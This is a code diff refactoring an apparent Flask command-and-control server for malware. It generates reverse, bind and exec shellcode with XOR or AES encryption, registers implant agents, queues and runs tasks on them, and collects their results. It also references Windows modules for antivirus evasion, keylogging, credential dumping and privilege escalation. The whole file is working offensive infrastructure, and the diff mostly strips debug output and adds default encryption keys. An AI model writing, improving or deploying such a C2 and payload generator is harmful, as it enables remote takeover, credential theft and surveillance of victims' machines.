@@ -29,7 +29,6 @@ app = Flask(__name__)
 shellcode_gen = ShellcodeGenerator()
 dns_tunnel = DNSTunnel("example.com")  # Replace with actual domain
 
-# Initialize Windows-specific instances only if on Windows
 if IS_WINDOWS:
     evasion = Evasion()
     keylogger = Keylogger()
@@ -39,7 +38,7 @@ if IS_WINDOWS:
     cred_dump = CredentialDump()
     priv_esc = PrivilegeEscalation()
 
-# Global storage for agents and tasks
+# Agent/task/result storage
 agents = {}
 tasks = {}
 results = {}
@@ -64,14 +63,11 @@ def generate_shellcode():
         encoding = data.get('encoding', 'base64')
         encryption = data.get('encryption', 'none')
         key = data.get('key', '')
-        print(f"Shellcode Type: {shellcode_type} | Platform: {platform} | Encoding: {encoding} | Encryption: {encryption}")
-
         shellcode = None
 
         if shellcode_type == 'reverse':
             host = data.get('host')
             port = data.get('port')
-            print(f"Reverse shell requested → Host: {host} | Port: {port}")
 
             if not host or not port:
                 return jsonify({'error': 'Host and port are required for reverse shell'}), 400
@@ -85,7 +81,6 @@ def generate_shellcode():
 
         elif shellcode_type == 'bind':
             port = data.get('port')
-            print(f"Bind shell requested → Port: {port}")
 
             if not port:
                 return jsonify({'error': 'Port is required for bind shell'}), 400
@@ -99,35 +94,29 @@ def generate_shellcode():
 
         elif shellcode_type == 'exec':
             command = data.get('command')
-            print(f"Exec shell requested → Command: {command}")
-
             if not command:
-                return jsonify({'error': 'Command is required for exec'}), 400
+                return jsonify({'error': 'Command is required for exec shellcode'}), 400
 
             shellcode = shellcode_gen.generate_exec(command, platform)
 
         else:
-            print("[!] Invalid shellcode type")
             return jsonify({'error': 'Invalid shellcode type'}), 400
 
         if shellcode is None:
-            print("[!] Shellcode generation failed")
             return jsonify({'error': 'Shellcode generation failed'}), 500
 
-        # Apply encryption if requested
+        # Apply encryption if selected
         if encryption != 'none':
             if encryption == 'xor':
-                shellcode = shellcode_gen.xor_encrypt(shellcode, key)
+                shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
             elif encryption == 'aes':
-                shellcode = shellcode_gen.aes_encrypt(shellcode, key)
+                shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")
 
+        # Encode for output
         encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
-
         if encoded_shellcode is None:
-            print("[!] Encoding shellcode failed")
-            return jsonify({'error': 'Encoding failed'}), 500
+            return jsonify({'error': 'Shellcode encoding failed'}), 500
 
-        print("[+] Shellcode generated and encoded successfully")
         return jsonify({
             'success': True,
             'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode
@@ -136,7 +125,6 @@ def generate_shellcode():
     except Exception as e:
         import traceback
         traceback.print_exc()
-        print("[!] Exception:", str(e))
         return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500
 
 @app.route('/api/agents', methods=['GET'])
@@ -154,8 +142,7 @@ def register_agent():
 
 @app.route('/api/tasks/<agent_id>', methods=['GET'])
 def get_tasks(agent_id):
-    agent_tasks = tasks.get(agent_id, [])
-    return jsonify(agent_tasks)
+    return jsonify(tasks.get(agent_id, []))
 
 @app.route('/api/tasks', methods=['POST'])
 def create_task():
@@ -180,7 +167,6 @@ def create_task():
         tasks[agent_id] = []
     tasks[agent_id].append(task)
 
-    # Execute task in background
     thread = threading.Thread(
         target=execute_task,
         args=(agent_id, task_id, task_type, task_data),
@@ -232,9 +218,7 @@ def execute_task(agent_id, task_id, task_type, task_data):
 @app.route('/api/results/<task_id>', methods=['GET'])
 def get_result(task_id):
     result = results.get(task_id)
-    if result:
-        return jsonify(result)
-    return jsonify({'status': 'not_found'}), 404
+    return jsonify(result or {'status': 'not_found'})
 
 @app.route('/api/results', methods=['POST'])
 def submit_result():
